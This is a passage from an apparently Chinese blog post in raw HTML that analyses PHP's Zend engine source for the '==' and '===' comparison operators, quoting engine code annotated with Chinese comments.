class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_DOUBLE, IS_LONG)</span>: <span class="hljs-comment">// OP1为浮点型，OP2为长整型</span></span><br><span class="hljs-function"><span class="hljs-title">Z_DVAL_P</span><span class="hljs-params">(result)</span> </span>= Z_DVAL_P(op1) - (<span class="hljs-keyword">double</span>)Z_LVAL_P(op2);<br>ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result)));<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_LONG, IS_DOUBLE)</span>: <span class="hljs-comment">// OP1为长整型，OP2位浮点型</span></span><br><span class="hljs-function"><span class="hljs-title">Z_DVAL_P</span><span class="hljs-params">(result)</span> </span>= (<span class="hljs-keyword">double</span>)Z_LVAL_P(op1) - Z_DVAL_P(op2);<br>ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result)));<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_DOUBLE, IS_DOUBLE)</span>: <span class="hljs-comment">// OP1和OP2都为浮点型</span></span><br><span class="hljs-function"><span class="hljs-title">if</span> <span class="hljs-params">(Z_DVAL_P(op1) == Z_DVAL_P(op2))</span> </span>&#123; <span class="hljs-comment">// 直接获取浮点数来做对比</span><br>ZVAL_LONG(result, <span class="hljs-number">0</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>Z_DVAL_P(result) = Z_DVAL_P(op1) - Z_DVAL_P(op2);<br>ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result)));<br>&#125;<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_ARRAY, IS_ARRAY)</span>: <span class="hljs-comment">// OP1和OP2都为数组</span></span><br><span class="hljs-function"><span class="hljs-title">ZVAL_LONG</span><span class="hljs-params">(result, zend_compare_arrays(op1, op2))</span></span>;<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_NULL, IS_NULL)</span>: <span class="hljs-comment">// OP1和OP2都为NULL</span></span><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_NULL, IS_FALSE)</span>: <span class="hljs-comment">// OP1为NULL，OP2为布尔型false</span></span><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_FALSE, IS_NULL)</span>: <span class="hljs-comment">// OP1为布尔型false，OP2为NULL</span></span><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_FALSE, IS_FALSE)</span>: <span class="hljs-comment">// OP1和OP2都为布尔型false</span></span><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_TRUE, IS_TRUE)</span>: <span class="hljs-comment">// OP1和OP2都为布尔型true</span></span><br><span class="hljs-function"><span class="hljs-title">ZVAL_LONG</span><span class="hljs-params">(result, <span class="hljs-number">0</span>)</span></span>;<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_NULL, IS_TRUE)</span>: <span class="hljs-comment">// OP1为NULL，OP2为布尔型true</span></span><br><span class="hljs-function"><span class="hljs-title">ZVAL_LONG</span><span class="hljs-params">(result, <span class="hljs-number">-1</span>)</span></span>;<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_TRUE, IS_NULL)</span>: <span class="hljs-comment">// OP1为布尔型true，OP2为NULL</span></span><br><span class="hljs-function"><span class="hljs-title">ZVAL_LONG</span><span class="hljs-params">(result, <span class="hljs-number">1</span>)</span></span>;<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_STRING, IS_STRING)</span>: <span class="hljs-comment">// OP1和OP2都为字符串</span></span><br><span class="hljs-function"><span class="hljs-title">if</span> <span class="hljs-params">(Z_STR_P(op1) == Z_STR_P(op2))</span> </span>&#123;<br>ZVAL_LONG(result, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>ZVAL_LONG(result, zendi_smart_strcmp(Z_STR_P(op1), Z_STR_P(op2)));<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_NULL, IS_STRING)</span>: <span class="hljs-comment">// OP1是NULL，OP2是字符串</span></span><br><span class="hljs-function"><span class="hljs-title">ZVAL_LONG</span><span class="hljs-params">(result, Z_STRLEN_P(op2) == <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : <span class="hljs-number">-1</span>)</span></span>;<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_STRING, IS_NULL)</span>: <span class="hljs-comment">// OP1是字符串，OP2是NULL</span></span><br><span class="hljs-function"><span class="hljs-title">ZVAL_LONG</span><span class="hljs-params">(result, Z_STRLEN_P(op1) == <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>)</span></span>;<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_OBJECT, IS_NULL)</span>: <span class="hljs-comment">// OP1是对象，OP2是NULL</span></span><br><span class="hljs-function"><span class="hljs-title">ZVAL_LONG</span><span class="hljs-params">(result, <span class="hljs-number">1</span>)</span></span>;<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_NULL, IS_OBJECT)</span>: <span class="hljs-comment">// OP1是NULL，OP2是对象</span></span><br><span class="hljs-function"><span class="hljs-title">ZVAL_LONG</span><span class="hljs-params">(result, <span class="hljs-number">-1</span>)</span></span>;<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-keyword">default</span>:<br>                ......<br>            <br></code></pre></td></tr></table></figure><p>在最后的<code>default</code>部分，我们会用到<code>PHP</code>对象存储的相关知识，先来看下了解下<code>PHP</code>中对象的存储结构。<br>路径：<code>Zend/zend_types.h:276</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">zend_object</span> &#123;</span><br>zend_refcounted_h gc; <span class="hljs-comment">// GC头部</span><br><span class="hljs-keyword">uint32_t</span>          handle; <span class="hljs-comment">// 结构体在全局变量中的索引</span><br>zend_class_entry *ce; <span class="hljs-comment">// 所属的类结构体指针</span><br><span class="hljs-keyword">const</span> zend_object_handlers *handlers; <span class="hljs-comment">// 指向对对象进行操作的多个指针函数</span><br>HashTable        *properties; <span class="hljs-comment">// 存储对象的动态属性值</span><br>zval              properties_table[<span class="hljs-number">1</span>]; <span class="hljs-comment">// 柔性数组，存储对象的普通属性值</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>以下是对对象进行操作的函数结构体定义，根据命名就能明白各个函数的功能是什么。<br>路径：<code>Zend/zend_object_handlers.h:124</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">zend_object_handlers</span> &#123;</span><br><span class="hljs-comment">/* offset of real object header (usually zero) */</span><br><span class="hljs-keyword">int</span>offset;<br><span class="hljs-comment">/* general object functions */</span><br><span class="hljs-keyword">zend_object_free_obj_t</span>free_obj;<br><span class="hljs-keyword">zend_object_dtor_obj_t</span>dtor_obj;<br><span class="hljs-keyword">zend_object_clone_obj_t</span>clone_obj;<br><span class="hljs-comment">/* individual object functions */</span><br><span class="hljs-keyword">zend_object_read_property_t</span>read_property;<br><span class="hljs-keyword">zend_object_write_property_t</span>write_property;<br><span class="hljs-keyword">zend_object_read_dimension_t</span>read_dimension;<br><span class="hljs-keyword">zend_object_write_dimension_t</span>write_dimension;<br><span class="hljs-keyword">zend_object_get_property_ptr_ptr_t</span>get_property_ptr_ptr;<br><span class="hljs-keyword">zend_object_get_t</span>get;<br><span class="hljs-keyword">zend_object_set_t</span><span class="hljs-built_in">set</span>;<br><span class="hljs-keyword">zend_object_has_property_t</span>has_property;<br><span class="hljs-keyword">zend_object_unset_property_t</span>unset_property;<br><span class="hljs-keyword">zend_object_has_dimension_t</span>has_dimension;<br><span class="hljs-keyword">zend_object_unset_dimension_t</span>unset_dimension;<br><span class="hljs-keyword">zend_object_get_properties_t</span>get_properties;<br><span class="hljs-keyword">zend_object_get_method_t</span>get_method;<br><span class="hljs-keyword">zend_object_call_method_t</span>call_method;<br><span class="hljs-keyword">zend_object_get_constructor_t</span>get_constructor;<br><span class="hljs-keyword">zend_object_get_class_name_t</span>get_class_name;<br><span class="hljs-keyword">zend_object_compare_t</span>compare_objects;<br><span class="hljs-keyword">zend_object_cast_t</span>cast_object;<br><span class="hljs-keyword">zend_object_count_elements_t</span>count_elements;<br><span class="hljs-keyword">zend_object_get_debug_info_t</span>get_debug_info;<br><span class="hljs-keyword">zend_object_get_closure_t</span>get_closure;<br><span class="hljs-keyword">zend_object_get_gc_t</span>get_gc;<br><span class="hljs-keyword">zend_object_do_operation_t</span>do_operation;<br><span class="hljs-keyword">zend_object_compare_zvals_t</span>compare;<br>&#125;;<br></code></pre></td></tr></table></figure><p>大致了解了下对象的存储结构，我们接着往下看。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">if</span> (Z_ISREF_P(op1)) &#123; <span class="hljs-comment">// 如果OP1是引用类型</span><br>op1 = Z_REFVAL_P(op1); <span class="hljs-comment">// 获取OP1真正指向的zval</span><br><span class="hljs-keyword">continue</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_ISREF_P(op2)) &#123; <span class="hljs-comment">// 如果OP1是引用类型</span><br>op2 = Z_REFVAL_P(op2); <span class="hljs-comment">// 获取OP1真正指向的zval</span><br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (Z_TYPE_P(op1) == IS_OBJECT &amp;&amp; Z_OBJ_HANDLER_P(op1, compare)) &#123; <span class="hljs-comment">// 如果OP1是对象，并且OP1的handlers.compare函数存在</span><br>ret = Z_OBJ_HANDLER_P(op1, compare)(result, op1, op2); <span class="hljs-comment">// 使用OP1的handlers.compare函数进行对比操作</span><br><span class="hljs-keyword">if</span> (UNEXPECTED(Z_TYPE_P(result) != IS_LONG)) &#123;<br>convert_compare_result_to_long(result);<br>&#125;<br><span class="hljs-keyword">return</span> ret;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(op2) == IS_OBJECT &amp;&amp; Z_OBJ_HANDLER_P(op2, compare)) &#123; <span class="hljs-comment">// 如果OP2是对象，并且OP2的handlers.compare函数存在</span><br>ret = Z_OBJ_HANDLER_P(op2, compare)(result, op1, op2); <span class="hljs-comment">// 使用OP2的handlers.compare函数进行对比操作</span><br><span class="hljs-keyword">if</span> (UNEXPECTED(Z_TYPE_P(result) != IS_LONG)) &#123;<br>convert_compare_result_to_long(result);<br>&#125;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-keyword">if</span> (Z_TYPE_P(op1) == IS_OBJECT &amp;&amp; Z_TYPE_P(op2) == IS_OBJECT) &#123; <span class="hljs-comment">// 如果OP1和OP2都是对象</span><br><span class="hljs-keyword">if</span> (Z_OBJ_P(op1) == Z_OBJ_P(op2)) &#123;<br><span class="hljs-comment">// 如果对象的handle相同，表示OP1和OP2是同一个对象</span><br>ZVAL_LONG(result, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-keyword">if</span> (Z_OBJ_HANDLER_P(op1, compare_objects) == Z_OBJ_HANDLER_P(op2, compare_objects)) &#123; <span class="hljs-comment">// 如果OP1.handlers.compare_objects函数与OP2的相同，则调用该函数进行对比</span><br>ZVAL_LONG(result, Z_OBJ_HANDLER_P(op1, compare_objects)(op1, op2));<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(op1) == IS_OBJECT) &#123; <span class="hljs-comment">// 如果OP1是个对象</span><br><span class="hljs-keyword">if</span> (Z_OBJ_HT_P(op1)-&gt;get) &#123; <span class="hljs-comment">// OP1.handlers.get函数存在</span><br>zval rv;<br>op_free = Z_OBJ_HT_P(op1)-&gt;get(op1, &amp;rv); <span class="hljs-comment">// 获取OP1的值</span><br>ret = compare_function(result, op_free, op2); <span class="hljs-comment">// 递归调用compare_function</span><br>zend_free_obj_get_result(op_free);<br><span class="hljs-keyword">return</span> ret;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(op2) != IS_OBJECT &amp;&amp; Z_OBJ_HT_P(op1)-&gt;cast_object) &#123; <span class="hljs-comment">// 如果OP2不是对象，并且OP1.handlers.cast_object函数(用来将对象转换为其他类型)存在</span><br>ZVAL_UNDEF(&amp;tmp_free);<br><span class="hljs-keyword">if</span> (Z_OBJ_HT_P(op1)-&gt;cast_object(op1, &amp;tmp_free, ((Z_TYPE_P(op2) == IS_FALSE || Z_TYPE_P(op2) == IS_TRUE) ? _IS_BOOL : Z_TYPE_P(op2))) == FAILURE) &#123; <span class="hljs-comment">// 如果OP2是布尔型，则将OP1转换为布尔型，否则转换失败</span><br>ZVAL_LONG(result, <span class="hljs-number">1</span>); <span class="hljs-comment">// OP1 &gt; OP2</span><br>zend_free_obj_get_result(&amp;tmp_free);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>ret = compare_function(result, &amp;tmp_free, op2);<br>zend_free_obj_get_result(&amp;tmp_free);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(op2) == IS_OBJECT) &#123; <span class="hljs-comment">// 如果OP2是个对象</span><br><span class="hljs-keyword">if</span> (Z_OBJ_HT_P(op2)-&gt;get) &#123; <span class="hljs-comment">// OP2.handlers.get函数存在</span><br>zval rv;<br>op_free = Z_OBJ_HT_P(op2)-&gt;get(op2, &amp;rv); <span class="hljs-comment">// 获取OP2的值</span><br>ret = compare_function(result, op1, op_free); <span class="hljs-comment">// 递归调用compare_function</span><br>zend_free_obj_get_result(op_free);<br><span class="hljs-keyword">return</span> ret;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(op1) != IS_OBJECT &amp;&amp; Z_OBJ_HT_P(op2)-&gt;cast_object) &#123; <span class="hljs-comment">// 如果OP1不是对象，并且OP2.handlers.cast_object函数(用来将对象转换为其他类型)存在</span><br>ZVAL_UNDEF(&amp;tmp_free);<br><span class="hljs-keyword">if</span> (Z_OBJ_HT_P(op2)-&gt;cast_object(op2, &amp;tmp_free, ((Z_TYPE_P(op1) == IS_FALSE || Z_TYPE_P(op1) == IS_TRUE) ? _IS_BOOL : Z_TYPE_P(op1))) == FAILURE) &#123; <span class="hljs-comment">// 如果OP1是布尔型，则将OP2转换为布尔型，否则转换失败</span><br>ZVAL_LONG(result, <span class="hljs-number">-1</span>); <span class="hljs-comment">// OP1 &lt; OP2</span><br>zend_free_obj_get_result(&amp;tmp_free);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>ret = compare_function(result, op1, &amp;tmp_free);<br>zend_free_obj_get_result(&amp;tmp_free);<br><span class="hljs-keyword">return</span> ret;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(op1) == IS_OBJECT) &#123;<br>ZVAL_LONG(result, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!converted) &#123; <span class="hljs-comment">// converted为0</span><br><span class="hljs-keyword">if</span> (Z_TYPE_P(op1) == IS_NULL || Z_TYPE_P(op1) == IS_FALSE) &#123; <span class="hljs-comment">// 如果OP1是NULL或者布尔型false</span><br>ZVAL_LONG(result, zval_is_true(op2) ? <span class="hljs-number">-1</span> : <span class="hljs-number">0</span>); <span class="hljs-comment">// 如果OP2转换为布尔型是ture，则OP1 &lt; OP2，否则，OP1 == OP2</span><br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(op2) == IS_NULL || Z_TYPE_P(op2) == IS_FALSE) &#123; <span class="hljs-comment">// 如果OP2是NULL或者布尔型false</span><br>ZVAL_LONG(result, zval_is_true(op1) ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>); <span class="hljs-comment">// 如果OP1转换为布尔型是ture，则OP1 &gt; OP2，否则，OP1 == OP2</span><br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(op1) == IS_TRUE) &#123; <span class="hljs-comment">// 如果OP1是布尔型true</span><br>ZVAL_LONG(result, zval_is_true(op2) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>); <span class="hljs-comment">// 如果OP2转换为布尔型是true，则OP1 == OP2，否则 OP1 &gt; OP2</span><br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(op2) == IS_TRUE) &#123; <span class="hljs-comment">// 如果OP2是布尔型true</span><br>ZVAL_LONG(result, zval_is_true(op1) ? <span class="hljs-number">0</span> : <span class="hljs-number">-1</span>); <span class="hljs-comment">// 如果OP1转换为布尔型是true，则OP1 == OP2，否则 OP1 &lt; OP2</span><br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>zendi_convert_scalar_to_number(op1, op1_copy, result, <span class="hljs-number">1</span>); <span class="hljs-comment">// 根据OP1的类型，转换为数字</span><br>zendi_convert_scalar_to_number(op2, op2_copy, result, <span class="hljs-number">1</span>); <span class="hljs-comment">// 根据OP2的类型，转换为数字</span><br>converted = <span class="hljs-number">1</span>; <span class="hljs-comment">// 标识已经经过了转换</span><br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(op1)==IS_ARRAY) &#123; <span class="hljs-comment">// 如果OP1的类型是数组</span><br>ZVAL_LONG(result, <span class="hljs-number">1</span>); <span class="hljs-comment">// OP1 &gt; OP2</span><br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(op2)==IS_ARRAY) &#123; <span class="hljs-comment">// 如果OP2的类型是数组</span><br>ZVAL_LONG(result, <span class="hljs-number">-1</span>); <span class="hljs-comment">// OP1 &lt; OP2</span><br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(op1)==IS_OBJECT) &#123; <span class="hljs-comment">// 如果OP1的类型是对象</span><br>ZVAL_LONG(result, <span class="hljs-number">1</span>); <span class="hljs-comment">// OP1 &gt; OP2</span><br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(op2)==IS_OBJECT) &#123; <span class="hljs-comment">// 如果OP2的类型是对象</span><br>ZVAL_LONG(result, <span class="hljs-number">-1</span>); <span class="hljs-comment">// OP1 &lt; OP2</span><br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ZVAL_LONG(result, <span class="hljs-number">0</span>); <span class="hljs-comment">// OP1 == OP2</span><br><span class="hljs-keyword">return</span> FAILURE;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>总体来看，在进行<code>==</code>运算的时候，虽然我们在写的时候只有短短的一句话，但是在<code>PHP</code>内核实现的时候，却是考虑到了各种可能的情况，还进行了类型转换，从而实现了一个松散的判断相等的运算符。<br>对于类型转换，重点就是宏<code>zendi_convert_scalar_to_number</code>，跟下去意义不是很大，有需要的可以查询<a href="https://www.php.net/manual/zh/language.types.type-juggling.php">官方手册</a></p><p><img src="https://image.mengsec.com/php-learn/20190616154021.png"></p><p>整个<code>==</code>运算符的功能实现大概就这么多，接下来我们来看一下<code>===</code>运算符的实现。</p><h4 id="2-2-2-‘-’-源码实现分析"><a href="#2-2-2-‘-’-源码实现分析" class="headerlink" title="2.2.2 ‘===’ 源码实现分析"></a>2.2.2 ‘===’ 源码实现分析</h4><p>根据我们前面的分析，寻找<code>ZEND_IS_IDENTICAL_SPEC_CV_CONST_HANDLER</code>函数。</p><p>路径：<code>Zend/zend_vm_execute.h:36494</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">static</span> ZEND_OPCODE_HANDLER_RET ZEND_FASTCALL <span class="hljs-title">ZEND_IS_IDENTICAL_SPEC_CV_CONST_HANDLER</span><span class="hljs-params">(ZEND_OPCODE_HANDLER_ARGS)</span></span><br><span class="hljs-function"></span>&#123;<br>USE_OPLINE<br><br>zval *op1, *op2;<br><span class="hljs-keyword">int</span> result;<br><br>SAVE_OPLINE();<br>op1 = _get_zval_ptr_cv_deref_BP_VAR_R(execute_data, opline-&gt;op1.var); <span class="hljs-comment">// 获取OP1</span><br>op2 = EX_CONSTANT(opline-&gt;op2); <span class="hljs-comment">// 获取OP2</span><br>result = fast_is_identical_function(op1, op2);<br><br><br>ZEND_VM_SMART_BRANCH(result, <span class="hljs-number">1</span>);<br>ZVAL_BOOL(EX_VAR(opline-&gt;result.var), result);<br>ZEND_VM_NEXT_OPCODE_CHECK_EXCEPTION();<br>&#125;<br></code></pre></td></tr></table></figure><p>很明显，函数在获取<code>OP1</code>和<code>OP2</code>之后，进入了<code>fast_is_identical_function</code>函数，跟进一下。<br>路径：<code>Zend/zend_operators.h:748</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">static</span> zend_always_inline <span class="hljs-keyword">int</span> <span class="hljs-title">fast_is_identical_function</span><span class="hljs-params">(zval *op1, zval *op2)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(op1) != Z_TYPE_P(op2)) &#123; <span class="hljs-comment">// 如果OP1和OP2的类型不相同，返回0</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(op1) &lt;= IS_TRUE) &#123; <span class="hljs-comment">// 可以看前面定义的宏来判断，如果OP1的类型是IS_UNDEF、IS_NULL、IS_FALSE、IS_TRUE，则返回1</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> zend_is_identical(op1, op2);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果以上两个条件都不成立，进入<code>zend_is_identical</code>函数并返回它的返回值，继续跟进。</p><p><img src="https://image.mengsec.com/php-learn/20190616171038.png"></p><p>路径：<code>Zend/zend_operators.c:2004</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">ZEND_API <span class="hljs-keyword">int</span> ZEND_FASTCALL <span class="hljs-title">zend_is_identical</span><span class="hljs-params">(zval *op1, zval *op2)</span> <span class="hljs-comment">/* &#123;&#123;&#123; */</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(op1) != Z_TYPE_P(op2)) &#123; <span class="hljs-comment">// 如果OP1和OP2的类型不相同，返回0</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">switch</span> (Z_TYPE_P(op1)) &#123; <span class="hljs-comment">// 获取OP1的类型</span><br><span class="hljs-keyword">case</span> IS_NULL:<br><span class="hljs-keyword">case</span> IS_FALSE:<br><span 